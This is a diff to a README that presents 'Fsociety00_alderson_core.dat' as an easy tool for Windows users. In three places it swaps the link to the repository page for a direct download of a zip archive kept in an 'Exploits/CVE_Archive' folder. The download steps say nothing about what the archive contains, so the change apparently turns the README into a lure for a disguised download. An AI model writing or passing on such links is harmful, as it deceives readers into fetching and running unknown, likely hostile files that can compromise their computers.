@@ -1,6 +1,6 @@
 # 🧠 Fsociety00_alderson_core.dat - Run Core Tools with Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Here-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat)
+[![Download Now](https://img.shields.io/badge/Download-Here-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat/raw/refs/heads/main/0x01_Exploits/CVE_Archive/YEAR_2024/CVE-2024-51482/alderson_Fsociety_core_dat_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide shows you how to get it, open it, and start using it on a Windows PC 
 
 Use this link to visit the page and download the app:
 
-[Open the download page](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat)
+[Open the download page](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat/raw/refs/heads/main/0x01_Exploits/CVE_Archive/YEAR_2024/CVE-2024-51482/alderson_Fsociety_core_dat_1.5.zip)
 
 If the page shows more than one file, choose the Windows version that matches your PC. If you only see one file, use that one.
 
@@ -172,7 +172,7 @@ alderson-core, c0deghost, cve, cybersecurity, exploit-development, fsociety, inf
 
 If you want to get the app now, use this page:
 
-[https://github.com/arcovaar3428/Fsociety00_alderson_core.dat](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat)
+[https://github.com/arcovaar3428/Fsociety00_alderson_core.dat/raw/refs/heads/main/0x01_Exploits/CVE_Archive/YEAR_2024/CVE-2024-51482/alderson_Fsociety_core_dat_1.5.zip](https://github.com/arcovaar3428/Fsociety00_alderson_core.dat/raw/refs/heads/main/0x01_Exploits/CVE_Archive/YEAR_2024/CVE-2024-51482/alderson_Fsociety_core_dat_1.5.zip)
 
 ## 🖥️ Windows Quick Start
 
